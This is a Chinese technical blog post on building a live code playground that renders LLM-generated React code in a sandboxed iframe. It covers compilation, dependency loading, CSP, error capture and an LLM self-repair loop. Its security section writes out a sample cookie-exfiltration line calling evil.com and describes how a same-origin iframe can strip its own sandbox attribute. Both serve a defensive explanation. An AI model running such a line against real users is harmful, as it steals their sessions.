# 左边改代码、右边实时渲染：Live Code Playground 是怎么做的

> 🔗 **在线 Demo**：[打开 Playground](https://sdxzy.github.io/arch-notes/demos/2026-10-17-live-code-playground/)（零构建静态页，GitHub Pages 直接托管）。左边改代码，右边 300ms 后刷新；下拉框里有计数器、带 key 的列表、故意出错、沙箱隔离检查、死循环 5 个示例。

## 1. Dong 的问题与背景

Dong 问的是：Claude Artifacts、v0、CodeSandbox 的 Sandpack 这种"**左边编辑代码，右边实时渲染**"的效果是怎么做出来的？

在 Agent 场景里这不是个玩具功能：

- **Agent 的 demo 页**：让用户直接看到 Agent 生成的 UI 跑起来，而不是一段代码；
- **AI 生成 UI**：LLM 产出的代码是**不可信代码**——它可能有 bug、死循环，也可能被提示注入写出偷 cookie 的代码；
- **自修复闭环**：渲染报错要能被捕获、结构化地回传给 LLM，让它自己改。

所以这件事的本质是：**在浏览器里安全地运行一段不可信的代码，并且能观测到它的结果和错误。**

## 2. 四段流水线

```text
编辑器 ──防抖 300ms──► ① 编译（sucrase）──► ② 依赖（import map → esm.sh）
                          │ 编译错误：父页面直接显示
                          ▼
                    ③ 沙箱（iframe sandbox + postMessage + Blob URL import）
                          │ rendered 回执 / 运行时错误
                          ▼
                    ④ 兜底（ErrorBoundary + onerror + 看门狗重建 iframe）
```

### 2.1 编译：浏览器里把 TSX 变成 JS

浏览器不认识 JSX 和 TypeScript，要先转译。sucrase 只做"去类型 + 转 JSX"，不做类型检查和降级，所以非常快（比 Babel 快一个数量级），适合每次编辑都跑一遍：

```js
import { transform } from "https://esm.sh/sucrase@3.35.0";
const { code } = transform(src, {
  transforms: ["jsx", "typescript"],
  jsxRuntime: "automatic",   // 产出 import { jsx } from "react/jsx-runtime"
  production: true,
});
```

**放在父页面编译**：语法错误不需要进沙箱就能报，编辑体验更快。配合 **300ms 防抖**：用户连续打字时不编译，停下来才编译一次。

### 2.2 依赖：import map + ESM CDN

编译后的代码里有 `import { useState } from "react"` 这种**裸模块名**，浏览器不知道去哪找。在 iframe 里放一个 import map，把它映射到 esm.sh 的 ESM 版本：

```html
<script type="importmap">
{ "imports": {
  "react": "https://esm.sh/react@18.3.1",
  "react/jsx-runtime": "https://esm.sh/react@18.3.1/jsx-runtime",
  "react-dom/client": "https://esm.sh/react-dom@18.3.1/client"
} }
</script>
```

**版本必须锁死**（`@18.3.1`，不写 `latest`）。esm.sh 也会把子依赖拆成独立模块，多个包共享同一个依赖时要用 `?deps=` 统一版本，否则会加载两份——demo 里的 CodeMirror 就踩到了这个坑，见第 6 节。

### 2.3 沙箱：iframe + postMessage + Blob URL

```js
// 父页面
const frame = document.createElement("iframe");
frame.setAttribute("sandbox", "allow-scripts");   // 没有 allow-same-origin
frame.srcdoc = SANDBOX_HTML;
frame.contentWindow.postMessage({ type: "run", code, runId }, "*");

// iframe 里
window.addEventListener("message", async (e) => {
  if (e.source !== window.parent || e.data?.type !== "run") return;
  const url = URL.createObjectURL(new Blob([e.data.code], { type: "text/javascript" }));
  const mod = await import(url);            // 每次新 URL，不会命中模块缓存
  root?.unmount();                          // 卸载旧树
  root = createRoot(document.getElementById("root"));
  root.render(<Boundary><Ack><mod.default /></Ack></Boundary>);
  URL.revokeObjectURL(url);
});
```

为什么用 **Blob URL + 动态 import** 而不是 `eval`/`new Function`：编译产物是 ES Module（有 `import`/`export`），只有模块加载器能执行它，而且模块里的裸模块名会走 import map。

为什么**每次 unmount 再 createRoot**：保证每次都是干净的组件树，旧代码的 state、effect 不会残留。代价是丢失状态——想保留状态就要做 Fast Refresh 那样的热替换，复杂度高很多。

### 2.4 兜底：三种错误 + 卡死

| 错误类型 | 在哪捕获 | demo 里的位置 |
|---|---|---|
| 语法 / 编译错误 | 父页面 `transform` 的 try/catch | 父页面红色面板"编译错误" |
| 模块顶层错误、import 失败 | iframe 里 `await import()` 的 catch | 回传 `phase: "module"` |
| 渲染期错误 | `ErrorBoundary.componentDidCatch` | 回传 `phase: "render"` |
| 事件回调 / setTimeout / Promise 错误 | `window.onerror`、`unhandledrejection` | 回传 `phase: "runtime"` |
| 死循环 / 卡死 | 父页面看门狗：N 秒没收到 `rendered` 回执 | 销毁并重建 iframe |

```js
// 父页面看门狗
watchdog = setTimeout(() => { buildFrame(); /* 重建 iframe */ }, 3000);
// iframe：真正 commit 之后再回执
function Ack({ children }) { useEffect(() => post({ type: "rendered" }), []); return children; }
```

每次运行都带 `runId`，父页面只认当前 runId 的消息，**过期运行的回执和报错直接丢掉**——和之前讲的 attempt 编号防"僵尸复活"是同一个思路。

## 3. 安全模型

### 为什么不能在主页面 eval

主页面有用户的 cookie、localStorage 里的 token、能以用户身份调用你的 API。在主页面执行 LLM 生成的代码，等于把账号交给它：一段 `fetch("https://evil.com?c=" + document.cookie)` 就能把会话偷走。**LLM 输出 = 不可信输入**，提示注入能让模型写出任何代码。

### sandbox 属性

| 写法 | 效果 |
|---|---|
| `sandbox=""` | 什么都不允许，连脚本都不能跑 |
| `sandbox="allow-scripts"` | ✅ 能跑脚本，但 origin 是不透明的 `null`：读不到 cookie / localStorage，碰不到 `parent.document`，不能弹窗、提交表单、导航顶层页面 |
| `sandbox="allow-scripts allow-same-origin"` | ⚠️ 如果 iframe 和父页面**同源**，里面的脚本可以直接 `parent.document.querySelector("iframe").removeAttribute("sandbox")`，沙箱形同虚设 |

demo 的"沙箱隔离检查"示例实测（headless Chromium）：`origin = null`，`document.cookie`、`localStorage`、`window.parent.document`、`top.location.href` 全部抛 `SecurityError`。

### 独立的 usercontent 域名

需要 `allow-same-origin`（比如代码要用 localStorage、Service Worker）时，正确做法是把预览放到**另一个站点**：比如 `xxx.usercontent.example.com` 或者干脆另一个注册域名（GitHub 的 `githubusercontent.com`、Google 的 `googleusercontent.com`、CodeSandbox 的 `*.csb.app` 都是这个思路）。不同站点之间有同源策略隔离，浏览器还会把它放到独立进程（Site Isolation）。每个用户/每个产物用不同子域名，彼此也隔离。

### CSP

在 iframe 页面上再加 CSP，限制代码能连到哪里：

```http
Content-Security-Policy: default-src 'none'; script-src https://esm.sh blob: 'unsafe-inline';
  style-src 'unsafe-inline'; img-src data: https:; connect-src 'none'
```

`connect-src 'none'` 让代码没法 `fetch` 往外发数据——即使跑在沙箱里拿不到 cookie，也可能把页面上显示的数据外传，CSP 堵的是这条路。注意 srcdoc iframe 会继承父页面的 CSP，要用 `<meta http-equiv>` 或独立域名的响应头来控制。

## 4. 方案对比（vs 取舍）

| 方案 | 原理 | 优点 | 代价 | 适合 |
|---|---|---|---|---|
| **DIY：iframe + sucrase + esm.sh**（本 demo） | 浏览器编译单文件，CDN 拉依赖 | 零后端、几百行、完全可控、秒开 | 只支持单文件/少量文件；不支持 CSS 模块、npm 私有包；依赖 CDN 可用性 | Agent 生成的单组件预览、文档里的可编辑示例 |
| **Sandpack**（CodeSandbox） | React 组件 + 托管的 bundler iframe（独立域名） | 多文件、npm 依赖、热更新、编辑器 UI 全套 | 依赖 CodeSandbox 的托管 bundler（可自托管但较重）；包体积大 | 想要"迷你 CodeSandbox"、多文件项目 |
| **esbuild-wasm** | 浏览器里跑真 esbuild，支持打包 | 支持多文件、真打包，速度快 | wasm 约 10MB 首次加载；npm 依赖仍要自己解析（插件 + CDN） | 需要多文件打包但不想要后端 |
| **WebContainers**（StackBlitz） | 浏览器里跑 Node.js（wasm + Service Worker） | 能跑 `npm install`、Vite dev server，完整 Node 环境 | 需要 COOP/COEP 跨源隔离头；**商业/生产使用需要 StackBlitz 的商业授权**（个人和开源原型可以免费试用）；内存占用大 | bolt.new 这种"整个项目在浏览器里跑" |
| **服务端沙箱**（E2B、Firecracker microVM、gVisor 容器） | 代码在隔离的 VM/容器里跑，返回结果或预览 URL | 任何语言、能装依赖、能跑后端和长任务，隔离强度最高 | 有成本（按秒计费）、冷启动几百毫秒到秒级、要运维或付费 | Agent 要执行 Python、跑测试、起完整全栈应用 |

选法：

- **只预览一个 React 组件**（Artifacts 风格）→ DIY iframe，够用且最轻；
- **多文件 + npm 依赖的前端项目** → Sandpack；
- **要跑 Node 工具链**（Vite、npm scripts）→ WebContainers，先确认授权；
- **要跑任意语言或后端代码、要强隔离** → E2B / Firecracker 这类服务端沙箱。

## 5. Agent 闭环：运行时错误回传给 LLM 自修复

```text
LLM 生成代码 ─► 编译 ─► 沙箱渲染 ─► rendered？──是──► 展示给用户
                 │          │
                 └─编译错误─┴─运行时错误（phase、message、stack 前几行）
                                  │
                                  ▼
               把错误 + 原代码喂回 LLM："修复这个错误，只返回完整代码"
                                  │ 最多重试 2–3 次
                                  ▼
                        仍失败 → 展示错误 + 让用户决定
```

要点：

- **错误要结构化**：`{ phase: "render", message, stack }` 比一张红屏截图对 LLM 有用得多；stack 只留前几行，并把 Blob URL 的行号映射回源码（sucrase 默认保留行号，所以可以直接对上）；
- **重试有上限**：和之前讲的重试预算一样，模型可能陷入"修 A 坏 B"的循环；
- **区分"可自修复"和"不该自修复"**：缺依赖、调用了被沙箱禁止的 API（比如读 cookie），应该告诉模型"这个环境不支持"，而不是让它反复尝试绕过；
- **静默失败也要检测**：渲染成功但页面是空的，可以截图或检查 DOM 是否为空，作为一种"软错误"反馈。

## 6. Bad Case 翻车点

- **在主页面 eval / new Function 执行生成代码**：直接拿到 cookie、token 和用户身份，提示注入 = 账号被盗。
- **同域名下给了 `allow-same-origin`**：iframe 里的脚本能访问父页面 DOM，甚至把自己的 sandbox 属性删掉。要么不给，要么换独立域名。
- **每次按键都重新编译执行**：打一个字触发一次编译、一次 iframe 重渲染，CPU 打满，打字卡顿；中间态代码大多是语法错误，错误面板一直闪。用 300ms 防抖。
- **没有 ErrorBoundary**：React 18 渲染期抛错会**卸载整棵树** → 白屏，用户和 LLM 都不知道发生了什么。
- **没有死循环保护**：`while(true)` 会卡死 iframe 的主线程。Chrome 会把 sandboxed iframe 放到独立进程，父页面不受影响，看门狗能重建它（demo 里实测通过）；但**不是所有浏览器都这样隔离**，在共享进程的浏览器里父页面也会一起卡死。更稳的做法是把预览放到独立站点（强制跨进程），或者在编译时给循环注入计数检查（CodePen 的 loop protect 思路）。
- **CDN 不锁版本**：`esm.sh/react` 不带版本号，哪天上游发了大版本你的页面就挂了。连子依赖也要锁：demo 里 CodeMirror 一开始用 `?deps=@codemirror/view@6.34.1` 锁了个旧版本，结果 `@codemirror/lang-javascript` 依赖的新 API（`activateHover`）不存在，编辑器加载失败、自动退回 textarea——锁版本要锁一组**互相兼容**的版本，并且要有降级方案。

## 7. Review 审 AI 方案时问什么

1. 生成的代码在哪执行？主页面还是隔离的 iframe / 独立域名？
2. sandbox 属性具体是什么？有没有 `allow-same-origin`？预览和主站同源吗？
3. postMessage 两端有没有校验 `event.source`？消息里有没有带 runId 防止旧消息覆盖新结果？
4. 编译错误、渲染错误、异步错误、死循环四类问题各自怎么兜？
5. CDN 依赖锁版本了吗？CDN 挂了怎么办？
6. 错误怎么回传给 LLM？自修复最多几轮？

## 8. Demo 说明

[在线打开](https://sdxzy.github.io/arch-notes/demos/2026-10-17-live-code-playground/) · 源码见文末 `index.html`（全部逻辑在一个文件里）。

headless Chromium（Playwright）实测结果（`test.mjs`）：

- 首次渲染成功，编辑器为 CodeMirror 6；
- 在编辑器里改代码（`Count:` → `Clicks:`），预览 300ms 后更新；iframe 里点击 +1 生效；
- 写一段语法错误 → 父页面显示"编译错误"；
- "故意出错"示例 → 错误面板显示 `TypeError: Cannot read properties of undefined (reading 'name')`；
- "沙箱隔离检查" → cookie、localStorage、parent、top 四项全部 `SecurityError`，`origin = null`；
- "死循环" → 3 秒后看门狗销毁并重建 iframe，之后切回计数器能继续渲染。

## 9. 复习题

**1. 为什么编译放在父页面，执行放在 iframe？反过来行不行？**

<details><summary>参考答案</summary>

- 编译只是字符串变换，不执行用户代码，放在父页面是安全的；而且语法错误能立刻在父页面显示，不需要和 iframe 来回通信；
- 执行必须在沙箱里，因为执行的才是不可信代码；
- 反过来（编译也放进 iframe）也可以，好处是父页面更轻、编译器崩了也不影响主页面；代价是每次都要等 iframe 回传编译结果。两种都行，**关键是执行绝不能放在父页面**。

</details>

**2. 产品要求预览里的代码能用 localStorage，你会怎么改沙箱设计？**

<details><summary>参考答案</summary>

- 不能在同域名下直接加 `allow-same-origin`，那样 iframe 能访问父页面、拿掉自己的 sandbox；
- 正确做法：把预览页部署到**独立站点**（比如另一个注册域名或 `*.usercontent` 子域名），iframe 指向这个 URL，再加 `allow-scripts allow-same-origin`。这时它有了自己的 origin 和 localStorage，但和主站跨站，同源策略仍然隔离它；
- 每个用户/产物用不同子域名，避免一个产物读到另一个产物的存储；
- 再用 CSP 限制 `connect-src`，防止数据外传。

</details>

**3. 用户在预览里写了 `while(true){}`，会发生什么？怎么保证编辑器不卡死？**

<details><summary>参考答案</summary>

- iframe 的主线程被卡死，永远不会发出 `rendered` 回执；
- 父页面的看门狗在 N 秒后销毁并重建 iframe（demo 用 3 秒）；
- 这依赖 iframe 和父页面**不在同一个线程/进程**：Chrome 会隔离 sandboxed iframe，但不是所有浏览器都保证。更稳的做法：预览放到独立站点（浏览器会强制跨进程），或者编译时注入循环计数保护（loop protect），或者把纯计算放到 Web Worker；
- 每次运行带 runId，重建后旧运行的消息被丢弃。

</details>

**4. Agent 生成的组件渲染报错了，怎么设计自修复闭环？要注意什么？**

<details><summary>参考答案</summary>

- 沙箱捕获错误（ErrorBoundary、onerror、unhandledrejection、import 失败），结构化回传 `{ phase, message, stack 前几行 }`；
- 把错误 + 原代码喂给 LLM，要求返回完整修复后的代码，再走一遍编译 → 渲染；
- 重试最多 2–3 次，超过就把错误展示给用户；
- 区分环境限制（被沙箱拦截、缺依赖）和代码 bug：环境限制要明确告诉模型"不支持"，不要让它反复尝试绕过沙箱；
- 渲染成功但内容为空，也当成软错误反馈。

</details>

**5. Artifacts 风格的单组件预览、多文件前端项目、需要跑 Python 的数据分析 Agent，分别选什么方案？**

<details><summary>参考答案</summary>

- 单组件预览 → DIY iframe + sucrase + esm.sh：零后端、最轻、秒开；
- 多文件 + npm 依赖的前端项目 → Sandpack（或 esbuild-wasm 自己搭）；要跑 Vite/npm 工具链就考虑 WebContainers，但商业使用要先确认 StackBlitz 的授权；
- 跑 Python / 后端代码 → 服务端沙箱（E2B、Firecracker microVM），隔离最强、语言不限，代价是按时长计费和冷启动。

</details>

## 10. 今日补充：白天聊过的三个话题

### 10.1 软件 = 状态 + 计算 + 协议

一个心智模型：任何系统都可以拆成**状态**（存在哪、谁能改）、**计算**（拿状态算出新状态）、**协议**（不同部分之间怎么约定说话）。这个模型好用，但有三个要警惕的地方：

- **副作用**：计算不总是纯函数。发邮件、扣款、调外部 API 一旦发生就收不回来，重试和回滚都要单独设计（幂等、补偿）；
- **分布式下机器不可靠**：状态分散在多台机器上，网络会断、机器会挂、时钟会偏，"一次计算"可能执行了一半、执行了两次，或者不知道执行了没有；
- **协议的语义比格式难**：JSON 字段对上了不代表双方理解一致。"至少一次 vs 恰好一次"、超时代表什么、字段缺省值是什么意思，这些语义约定才是协议真正难的部分。

### 10.2 后端工具地图

| 类别 | 典型工具 | 解决什么问题 | 代价 |
|---|---|---|---|
| 状态 | PostgreSQL/MySQL、Redis、对象存储、ES | 持久化、查询、缓存、检索 | 一致性、迁移、备份、容量规划 |
| 计算 | API 服务、Worker、队列消费者、Serverless、定时任务 | 同步处理请求、异步处理长任务 | 扩缩容、超时、重试、幂等 |
| 通信 | HTTP/gRPC、消息队列（Kafka/RabbitMQ）、WebSocket/SSE | 服务之间、前后端之间传数据 | 协议版本、背压、消息丢失/重复 |
| 可观测 | 日志、指标（Prometheus）、链路追踪（OpenTelemetry）、告警 | 知道系统现在怎样、哪里出了问题 | 存储成本、埋点工作量、告警噪音 |
| 部署 | Docker、K8s、CI/CD、云平台 | 稳定可重复地发布和运行 | 学习曲线、运维复杂度、平台锁定 |

### 10.3 事务

- **ACID**：原子性（要么全做要么全不做）、一致性（约束始终成立）、隔离性（并发事务互不干扰）、持久性（提交了就不会丢）；
- **三个边界**：
  - **事务管不了外部调用**：事务里调了支付接口，事务回滚了钱却扣了。做法是 **Outbox 模式**——业务数据和"待发送消息"写进同一个数据库事务，提交后再由后台进程把消息发出去；
  - **事务要短**：长事务长期持有锁，拖慢甚至锁死其他请求。不要在事务里等 LLM、调外部 API、等用户操作；
  - **跨服务没有事务**：多个服务各自有数据库，用 **Saga**——每一步本地事务 + 失败时按相反顺序执行补偿操作（比如"取消订单""退款"），接受中间状态短暂不一致。
